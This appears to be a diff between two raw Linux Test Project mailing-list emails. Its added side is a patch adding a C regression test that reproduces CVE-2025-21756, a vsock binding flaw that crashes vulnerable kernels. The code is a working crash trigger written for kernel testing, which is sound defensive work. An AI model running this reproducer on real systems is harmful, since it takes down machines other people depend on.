@@ -4,93 +4,110 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 3E3D6CAC592
-	for <ltp@archiver.kernel.org>; Mon, 22 Sep 2025 08:49:28 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=lists.linux.it;
- i=@lists.linux.it; q=dns/txt; s=picard; t=1758530966; h=mime-version :
- references : in-reply-to : date : message-id : to : subject : list-id
- : list-unsubscribe : list-archive : list-post : list-help :
- list-subscribe : from : reply-to : cc : content-type :
- content-transfer-encoding : sender : from;
- bh=n73t5knMIA1t6qKWkAWWhbrGySLqT7CZp0OhN87QJJc=;
- b=RpGsxlpcRNzKOVirccS8d9VMq1Up6qH4YPvdxS1LjDrAaycdKycwLPOZcW9DYzHL0EaxJ
- /ZRVjhZvwmpNdmQIPJ0+ciW/RQD+fbRWTXIBG4fyh6LdVbuNms2SDAvrX6uupVUVGUwF08C
- FWkKaVUoG3ghS05rPfuR30U/4WMXQDk=
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id CE3DDCAC5AC
+	for <ltp@archiver.kernel.org>; Mon, 22 Sep 2025 10:19:19 +0000 (UTC)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 96A6B3CDE3F
-	for <ltp@archiver.kernel.org>; Mon, 22 Sep 2025 10:49:26 +0200 (CEST)
-Received: from in-7.smtp.seeweb.it (in-7.smtp.seeweb.it [217.194.8.7])
+	by picard.linux.it (Postfix) with ESMTP id 4B6D63CDE41
+	for <ltp@archiver.kernel.org>; Mon, 22 Sep 2025 12:19:17 +0200 (CEST)
+Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it [217.194.8.2])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (secp384r1))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id B4FB53C2566
- for <ltp@lists.linux.it>; Mon, 22 Sep 2025 10:49:05 +0200 (CEST)
-Received: from us-smtp-delivery-124.mimecast.com
- (us-smtp-delivery-124.mimecast.com [170.10.129.124])
+ by picard.linux.it (Postfix) with ESMTPS id 6CA823CCF3A
+ for <ltp@lists.linux.it>; Mon, 22 Sep 2025 12:19:02 +0200 (CEST)
+Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-7.smtp.seeweb.it (Postfix) with ESMTPS id 053B52002B6
- for <ltp@lists.linux.it>; Mon, 22 Sep 2025 10:49:04 +0200 (CEST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
- s=mimecast20190719; t=1758530943;
- h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
- to:to:cc:cc:mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=oZd9V9Y2EEKY5IxR5FyfaxsYVNQkaYubUl6ixtbI9ag=;
- b=DlzE3Dql9DBvNfv3yGzNKC2k+NMv52mA9v+X8ohp9AHbPoXSBnuB6DENw6fnHZHAhxdMwX
- ia0lqBtYiHdoN9uBsPgLUCLknPGN2+4ma+g0qwzJsI5VYvt1fp8aoCkfHgIWoohpSsqc9s
- OdKp7QFqHM0Ij4PhqtKhGyGNXUspS8E=
-Received: from mail-wr1-f72.google.com (mail-wr1-f72.google.com
- [209.85.221.72]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
- us-mta-347-4n9tKU9DO-u8ZxZIPrq_jQ-1; Mon, 22 Sep 2025 04:49:01 -0400
-X-MC-Unique: 4n9tKU9DO-u8ZxZIPrq_jQ-1
-X-Mimecast-MFC-AGG-ID: 4n9tKU9DO-u8ZxZIPrq_jQ_1758530940
-Received: by mail-wr1-f72.google.com with SMTP id
- ffacd0b85a97d-3f3c118cbb3so2110423f8f.3
- for <ltp@lists.linux.it>; Mon, 22 Sep 2025 01:49:01 -0700 (PDT)
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1758530940; x=1759135740;
- h=content-transfer-encoding:cc:to:subject:message-id:date:from
- :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
- :subject:date:message-id:reply-to;
- bh=oZd9V9Y2EEKY5IxR5FyfaxsYVNQkaYubUl6ixtbI9ag=;
- b=sraCmgjz36BwSMm87MQNHR8Ozp+fYJ1uHevjrNjjY74jGGymtP7P+cMnwX/INJfg7a
- 4qBHf4j8AfqO3/Rb6BCfwIUGs8GOLG4L4fL07QM9ejpZkbtMBT4dgOHpOi8ewLCSpoQH
- c776YU6liQxhfa0RbOrRxSzeBtUFFeUa6ahdQXN/QGEEXR+eNYKlh/U9+7YcWCSHTuKL
- eC5IY081iKEeiNjz6VvHVSI4s7oG2t1AS6q7QH7t1DS0iQXED2OeDOD5YGZt9D9Sq1U1
- NY/KsYkJXEUGVWrF8aFhUiyMZqkZlBBYOCJ5Tx46rAtk4uuX2XrwF80VzbtfUxFnrflw
- msmQ==
-X-Gm-Message-State: AOJu0YwhfK7Zo5bfAEy+qryRjoV/OZR9U30sq86a0SM2VdJMumXUdHUK
- C9AKJ2SpxpFUxUQ/aOmVekh2XCCOwKXXL+iowURZs9cjW0bK8lE6kz7Ipb/Ls834RPmp3DqLCbV
- Sdkrg5VIO/RU5eAFcfAZ06k7NA8lok0lVv/B0i2/6R0IkevC0fzoUV1upDuTjUw8KbBKZJTSU9j
- UBxht9wINR9wdd8Tdt2pqR+DdPOno=
-X-Gm-Gg: ASbGncvzenEV35KmJ8M3FXFxXdCuskeiQGobouwBAfkoPVC5dstRf/zN5tsS1YgF7CJ
- wzGJT/09Z7gcEAUkq32UxEpZoDSsnYHk9xKozxLqfUKCu95RRQe5mTztmtMztCRQQmJeFcp9fT+
- 3R+zpWt4NSS15Rz9lXfwqUJbbhslaxwoGD+I686d4LX1DGAWqR3XUw+5zpsD1iAwa2vi0kkd10I
- JgjbpNlt/mgcgVVGytV5Qc=
-X-Received: by 2002:a05:6000:2209:b0:3ec:e285:546b with SMTP id
- ffacd0b85a97d-3ee8558132dmr9655631f8f.50.1758530940423; 
- Mon, 22 Sep 2025 01:49:00 -0700 (PDT)
-X-Google-Smtp-Source: AGHT+IE0oN+MkrTjguyVNTk9WuYNN9rS80YHJPRTVl0k7n1lz5mzbVmSyvFgmAJKNRGePRK5HBrkJ1zVyPuhRHgE69U=
-X-Received: by 2002:a05:6000:2209:b0:3ec:e285:546b with SMTP id
- ffacd0b85a97d-3ee8558132dmr9655601f8f.50.1758530939976; Mon, 22 Sep 2025
- 01:48:59 -0700 (PDT)
+ by in-2.smtp.seeweb.it (Postfix) with ESMTPS id D10B160029A
+ for <ltp@lists.linux.it>; Mon, 22 Sep 2025 12:19:01 +0200 (CEST)
+Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
+ [IPv6:2a07:de40:b281:104:10:150:64:97])
+ (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+ key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
+ (No client certificate requested)
+ by smtp-out2.suse.de (Postfix) with ESMTPS id 1E6CD1FFE1;
+ Mon, 22 Sep 2025 10:19:00 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+ t=1758536341; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ mime-version:mime-version:content-type:content-type:
+ content-transfer-encoding:content-transfer-encoding;
+ bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
+ b=pQF5bbrQrFbpnq7gghxG/MyKAQWMNoQAKntF4ZYFVKLswS8j/3lJfS814bFlr+1Y7vg5Wj
+ tQHgduP6MZlmO81mWx9a8mAf2BJDj/v7utmjM+LRBWfz/4bhw+KXHZu8ui8578jdYdwv9z
+ 9OmAhvpH4CaoYvtXgBlVX3teb14Xu3U=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+ s=susede2_ed25519; t=1758536341;
+ h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ mime-version:mime-version:content-type:content-type:
+ content-transfer-encoding:content-transfer-encoding;
+ bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
+ b=H7bFYrOKxJEphC9DDraUFZbuT84jKOnA11J0ncybaUgkmXzAPj5I1z3jgBtukpE3nOTdev
+ pLdx4e/qz3mCq0Dg==
+Authentication-Results: smtp-out2.suse.de;
+ dkim=pass header.d=suse.de header.s=susede2_rsa header.b=KaD3jeaC;
+ dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b="DxLdHL/r"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
+ t=1758536340; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ mime-version:mime-version:content-type:content-type:
+ content-transfer-encoding:content-transfer-encoding;
+ bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
+ b=KaD3jeaCAtDO4Uft5kvxHXp6/3Dunf6VW0vil+vX0j9U5xsDihhdyr8eA15s/fIn2HexoS
+ tmKLWdWqwve6RsdxS+cjYx/uXzKcFncoq6apmQwW5v4FJ0Um0Jfp1T17rLrj5vaYLiMf2n
+ eRvaCOfDunKGyj3VswsrTe2ICfMP5NE=
+DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
+ s=susede2_ed25519; t=1758536340;
+ h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ mime-version:mime-version:content-type:content-type:
+ content-transfer-encoding:content-transfer-encoding;
+ bh=ClamKM54UzH3F8E9SQ9FoyUg30+wIckN/7wVOSoAGDY=;
+ b=DxLdHL/rrWn1XSACzfkpjr2mH52P0AIp3H9yTeTjJAF6URoNsLzinpqNEVwjkNee7AOfgU
+ G/XkNvX9Vu9/BvCw==
+Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
+ (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+ key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
+ (No client certificate requested)
+ by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id E3A8313A63;
+ Mon, 22 Sep 2025 10:18:59 +0000 (UTC)
+Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
+ by imap1.dmz-prg2.suse.org with ESMTPSA id PcEJM5Mi0WgQOgAAD6G6ig
+ (envelope-from <andrea.cervesato@suse.de>); Mon, 22 Sep 2025 10:18:59 +0000
+From: Andrea Cervesato <andrea.cervesato@suse.de>
+Date: Mon, 22 Sep 2025 12:18:54 +0200
 MIME-Version: 1.0
-References: <20250917102737.GA336745@pevik>
-In-Reply-To: <20250917102737.GA336745@pevik>
-Date: Mon, 22 Sep 2025 10:48:43 +0200
-X-Gm-Features: AS18NWAuwVr4slZGXafeNfXFwhzq-3tRdTB01zeXDEZ9Zvzfp004J6TUHFseZ3g
-Message-ID: <CAASaF6yjdrLLVnehESx1TjsrB_z48nmN_2i585GPfkG3Vvg15Q@mail.gmail.com>
-To: Petr Vorel <pvorel@suse.cz>
-X-Mimecast-Spam-Score: 0
-X-Mimecast-MFC-PROC-ID: QJIHfGw_imCG4J5ukKEonJsBzPat8__9hJRwUStP4ME_1758530940
-X-Mimecast-Originator: redhat.com
-X-Virus-Scanned: clamav-milter 1.0.7 at in-7.smtp.seeweb.it
+Message-Id: <20250922-cve-2025-21756-v1-1-074da211288a@suse.com>
+X-B4-Tracking: v=1; b=H4sIAI0i0WgC/x3MQQqAIBBA0avErBvQoZK6SrQwHWs2FgoRhHfPW
+ r7F/w9kTsIZpuaBxJdkOWKFbhtwu40bo/hqIEW9GonQXYwfkLTpB2Rtg/PWrOQ7qNGZOMj9D+e
+ llBebakViYAAAAA==
+X-Change-ID: 20250922-cve-2025-21756-e1afcda7b2d4
+To: ltp@lists.linux.it
+X-Mailer: b4 0.14.2
+X-Developer-Signature: v=1; a=ed25519-sha256; t=1758536339; l=3872;
+ i=andrea.cervesato@suse.com; s=20250922; h=from:subject:message-id;
+ bh=ZIKkQcuoEpspc5l5paIInX9PUtYTcgPkq6Wo3h7loCs=;
+ b=eYGc3mAPu2X02wgPoG3kCyx3UbcYWeQjfZfCElhtwWmaxP5IdIgIIyELiAzQz6Snc6Kd7WkWl
+ 54wuodo6/OyDlowNOCboAu9NjoSD+3Gqa+hgp7PE0v5DDd70lTBW/wb
+X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
+ pk=+8M3XgViLdcdNBM+Jdd90m3pV4jCw2tNsGCy5Rd+qHk=
+X-Rspamd-Queue-Id: 1E6CD1FFE1
+X-Rspamd-Action: no action
+X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
+X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
+ NEURAL_HAM_LONG(-1.00)[-1.000];
+ R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
+ NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
+ MX_GOOD(-0.01)[]; RCVD_TLS_ALL(0.00)[];
+ RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
+ FUZZY_RATELIMITED(0.00)[rspamd.com]; MIME_TRACE(0.00)[0:+];
+ RCPT_COUNT_TWO(0.00)[2];
+ DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
+ TO_MATCH_ENVRCPT_ALL(0.00)[]; FROM_HAS_DN(0.00)[];
+ TO_DN_SOME(0.00)[]; FROM_EQ_ENVFROM(0.00)[];
+ DBL_BLOCKED_OPENRESOLVER(0.00)[suse.com:email,suse.com:mid,suse.de:dkim];
+ RCVD_COUNT_TWO(0.00)[2]; DKIM_TRACE(0.00)[suse.de:+]
+X-Virus-Scanned: clamav-milter 1.0.7 at in-2.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: Re: [LTP] [RFC] 'nobody' user for testing
+Subject: [LTP] [PATCH] cve: add test reproducer for cve-2025-21756
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -102,49 +119,150 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-From: Jan Stancek via ltp <ltp@lists.linux.it>
-Reply-To: Jan Stancek <jstancek@redhat.com>
-Cc: Betty Zhou <bettyzhou@google.com>, ltp@lists.linux.it,
- Edward Liaw <edliaw@google.com>
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
-T24gV2VkLCBTZXAgMTcsIDIwMjUgYXQgMTI6MjfigK9QTSBQZXRyIFZvcmVsIDxwdm9yZWxAc3Vz
-ZS5jej4gd3JvdGU6Cj4KPiBIaSwKPgo+IEkgZm91bmQgYSBzZXR1cCBidWcgb24gTFRQIElNQSB0
-ZXN0cyBpbWFfY29uZGl0aW9uYWxzLnNoIGFuZAo+IGltYV9tZWFzdXJlbWVudHMuc2ggd2hpY2gg
-dXNlICdzdWRvJyAod2l0aCB1c2VyICdub2JvZHknKS4gV2UgaGF2ZSBtYW55IEMgdGVzdHMKPiBp
-biBMVFAgd2hpY2ggdXNlICdub2JvZHknIHVzZXIgc29tZWhvdywgYnV0IHRoZXkgZG9uJ3QgYWN0
-dWFsbHkgZXhlY3V0ZQo+IGFueXRoaW5nIHdpdGggdGhpcyBhY2NvdW50LiBJTUhPIHRoZXNlIGFy
-ZSB0aGUgb25seSB0ZXN0cyB3aGljaCBleGVjdXRlIHdpdGggJ3N1ZG8nCj4gKHBsZWFzZSBkb3Vi
-bGUgY2hlY2sgbWUpLgo+Cj4gJCBnaXQgZ3JlcCAtbCBub2JvZHkgdGVzdGNhc2VzL2tlcm5lbC9z
-eXNjYWxscy8gfCB3YyAtbAo+IDE2MAo+Cj4gQmVjYXVzZSBvbiBuZXdlciBzeXN0ZW1zIChJIGNo
-ZWNrZWQgVHVtYmxld2VkLCBGZWRvcmEsIERlYmlhbikgJ25vYm9keScgYWNjb3VudCB1c2UKPiAv
-dXNyL3NiaW4vbm9sb2dpbiB3aGljaCBwcmV2ZW50cyBsb2dnaW5nLCB3ZSAxKSBlaXRoZXIgbmVl
-ZCB0byBjaGFuZ2UgYWNjb3VudAo+IHRvIHVzZSBiYXNoIChhbmQgcmVzdG9yZSBpdCBiYWNrIGFm
-dGVyIHRlc3RpbmcpIG9yIDIpIGNyZWF0ZSBhIGRlZGljYXRlZCB1c2VyCj4gZm9yIHRlc3Rpbmcu
-IEknZCB0cnkgdG8gdXNlICd1c2VyYWRkJyBhbmQgY2hlY2sgd2l0aCBncmVwIC9ldGMvcGFzc3dk
-IGlmIHRoZQo+IHVzZXIgaXMgbm90IGFscmVhZHkgZGVmaW5lZC4KPgo+IEkgdGVuZCB0byB1c2Ug
-MiksIGFkZCBpdCBvbmx5IHRvIElNQSB0ZXN0cyAodG8gaW1hX3NldHVwLnNoKS4gQnV0IEkgY291
-bGQKPiBwdXQgc29tZSBtb3JlIGdlbmVyaWMgY29kZSB0byB0c3RfdGVzdC5zaCBzbyB0aGF0IGl0
-IGNhbiBiZSByZXVzZWQgYnkgb3RoZXIKPiB0ZXN0cyBpbiB0aGUgZnV0dXJlLiBXRFlUPwoKSGkg
-UGV0ciwKCkRvIHRob3NlIHRlc3RzIHN0YXJ0IHVuZGVyIHJvb3QgdXNlcj8gSSdtIHRoaW5raW5n
-IHdlIHdyaXRlIG91ciBvd24KKG11Y2ggc2ltcGxlcikKdmVyc2lvbiBvZiAic3VkbyIsIHRoYXQg
-anVzdCBjaGFuZ2VzIHVpZC9naXQgYmFzZWQgb24gcGFyYW1ldGVycyBhbmQKZXhlY3V0ZXMgd2hh
-dGV2ZXIgd2UgZ2l2ZSBpdC4KCkphbgoKPgo+IEFsc28sIGFzIHdlIGhlYXZpbHkgdXNlICdub2Jv
-ZHknIGFscmVhZHkgSSdtIG5vdCBzdXJlIGlmIGl0J3Mgd29ydGggdG8gYm90aGVyCj4gd2l0aCBw
-dXR0aW5nIGVudmlyb25tZW50IHZhcmlhYmxlIGFsbG93aW5nIGEgZGlmZmVyZW50IHVzZXIuIE5v
-Ym9keSBzbyBmYXIgY29tcGxhaW5lZCwKPiBldmVuIEFPU1AgZm9sa3Mgc2VlbSB0byBiZSB1c2Vk
-IEMgdGVzdHMgd2hpY2ggdXNlICdub2JvZHknIChlLmcuIGZjaG1vZDA2LmMgaXMKPiBjb21waWxl
-ZCBbMV0gYW5kIG5vdCBkaXNhYmxlZCBbMl0pLgo+Cj4gQWxzbywgd2UgYWdyZWVkIHdpdGggQ3ly
-aWwsIHRoYXQgaXQnZCBiZSBnb29kIHRvIGNvbnZlcnQgdGhlc2UgMiBJTUEgdGVzdHMgdG8KPiB1
-c2UgJ3N1JyBpbnN0ZWFkIG9mICdzdWRvJyBiZWNhdXNlICdzdScgaXMgc2ltcGxlciB0aGFuICdz
-dWRvJyAoYWx0aG91Z2ggd2hlbgo+IHRlc3Rpbmcgd2l0aCByYXBpZG8gWzNdIG5vbmUgb2YgdGhl
-bSB3b3JrcyBvdXQgb2YgdGhlIGJveCkuCj4KPiBbMV0gaHR0cHM6Ly9hbmRyb2lkLmdvb2dsZXNv
-dXJjZS5jb20vcGxhdGZvcm0vZXh0ZXJuYWwvbHRwLysvcmVmcy9oZWFkcy9tYWluL2FuZHJvaWQv
-QW5kcm9pZC5icAo+IFsyXSBodHRwczovL2FuZHJvaWQuZ29vZ2xlc291cmNlLmNvbS9wbGF0Zm9y
-bS9leHRlcm5hbC9sdHAvKy9yZWZzL2hlYWRzL21haW4vYW5kcm9pZC90b29scy9kaXNhYmxlZF90
-ZXN0cy50eHQKPiBbM10gaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkby1saW51eC9yYXBpZG8KPgoK
-Ci0tIApNYWlsaW5nIGxpc3QgaW5mbzogaHR0cHM6Ly9saXN0cy5saW51eC5pdC9saXN0aW5mby9s
-dHAK
+From: Andrea Cervesato <andrea.cervesato@suse.com>
+
+This test is verifying kernel commit fcdd2242c023 "vsock: Keep the
+binding until socket destruction" merged inside v6.14.
+
+Beware, it will crash the system!
+
+Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
+---
+ runtest/cve                    |  1 +
+ testcases/cve/.gitignore       |  1 +
+ testcases/cve/cve-2025-21756.c | 92 ++++++++++++++++++++++++++++++++++++++++++
+ 3 files changed, 94 insertions(+)
+
+diff --git a/runtest/cve b/runtest/cve
+index 6d575aa2165bcd46e5ca36a07db33f69a91bd94a..c3ecd74dd9f837924b810b7b431ebb911d809966 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -92,3 +92,4 @@ cve-2020-25704 perf_event_open03
+ cve-2022-0185 fsconfig03
+ cve-2022-4378 cve-2022-4378
+ cve-2025-38236 cve-2025-38236
++cve-2025-21756 cve-2025-21756
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index 8eb17ce56b01070e47917f9bb44cf146c0c5b338..dc1dad5b0d0d02a3ab57e72516c33ee7949c8431 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -14,3 +14,4 @@ cve-2022-4378
+ icmp_rate_limit01
+ tcindex01
+ cve-2025-38236
++cve-2025-21756
+diff --git a/testcases/cve/cve-2025-21756.c b/testcases/cve/cve-2025-21756.c
+new file mode 100644
+index 0000000000000000000000000000000000000000..7920dc716bc86456be5380d129e3a1b7d788fb83
+--- /dev/null
++++ b/testcases/cve/cve-2025-21756.c
+@@ -0,0 +1,92 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++/*
++ * Copyright (c) 2025 Andrea Cervesato <andrea.cervesato@suse.com>
++ */
++
++/*\
++ * Test for CVE-2025-21756 fixed in kernel v6.14:
++ * fcdd2242c023 vsock: Keep the binding until socket destruction
++ *
++ * Reproducer based on:
++ * https://lore.kernel.org/all/20250128-vsock-transport-vs-autobind-v3-5-1cf57065b770@rbox.co/
++ *
++ * Beware, this test will crash the system.
++ */
++
++#include "tst_test.h"
++
++#if HAVE_LINUX_VM_SOCKETS_H
++
++#include "lapi/vm_sockets.h"
++
++#define MAX_PORT_RETRIES	24
++#define VMADDR_CID_NONEXISTING	42
++
++static int vsock_bind(unsigned int cid, unsigned int port, int type)
++{
++	int sock;
++
++	struct sockaddr_vm sa = {
++		.svm_family = AF_VSOCK,
++		.svm_cid = cid,
++		.svm_port = port,
++	};
++
++	sock = SAFE_SOCKET(AF_VSOCK, type, 0);
++	SAFE_BIND(sock, (struct sockaddr *)&sa, sizeof(sa));
++
++	return sock;
++}
++
++static void run(void)
++{
++	int sockets[MAX_PORT_RETRIES];
++	struct sockaddr_vm addr;
++	int socket, sock_count;
++	socklen_t alen;
++
++	socket = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);
++
++	alen = sizeof(addr);
++	SAFE_GETSOCKNAME(socket, (struct sockaddr *)&addr, &alen);
++
++	for (sock_count = 0; sock_count < MAX_PORT_RETRIES; ++sock_count) {
++		sockets[sock_count] = vsock_bind(VMADDR_CID_ANY,
++				   ++addr.svm_port, SOCK_SEQPACKET);
++	}
++
++	SAFE_CLOSE(socket);
++
++	socket = SAFE_SOCKET(AF_VSOCK, SOCK_SEQPACKET, 0);
++	if (!connect(socket, (struct sockaddr *)&addr, alen))
++		tst_brk(TBROK, "Unexpected connect() #1 success");
++
++	addr.svm_cid = VMADDR_CID_NONEXISTING;
++	if (!connect(socket, (struct sockaddr *)&addr, alen))
++		tst_brk(TBROK, "Unexpected connect() #2 success");
++
++	addr.svm_cid = VMADDR_CID_LOCAL;
++	addr.svm_port = VMADDR_PORT_ANY;
++
++	/* Vulnerable system may crash now. */
++	SAFE_BIND(socket, (struct sockaddr *)&addr, alen);
++	SAFE_CLOSE(socket);
++
++	tst_res(TPASS, "System still running after socket unbinding");
++
++	while (sock_count--)
++		SAFE_CLOSE(sockets[sock_count]);
++}
++
++static struct tst_test test = {
++	.test_all = run,
++	.tags = (const struct tst_tag[]) {
++		{"linux-git", "fcdd2242c023"},
++		{"CVE", "2025-21756"},
++		{}
++	}
++};
++
++#else
++TST_TEST_TCONF("No linux/vm_sockets.h");
++#endif
+
+---
+base-commit: 2f208c00cfc4a1d7d5d957ac2b866e1248623aa6
+change-id: 20250922-cve-2025-21756-e1afcda7b2d4
+
+Best regards,
+-- 
+Andrea Cervesato <andrea.cervesato@suse.com>
+
+
+-- 
+Mailing list info: https://lists.linux.it/listinfo/ltp
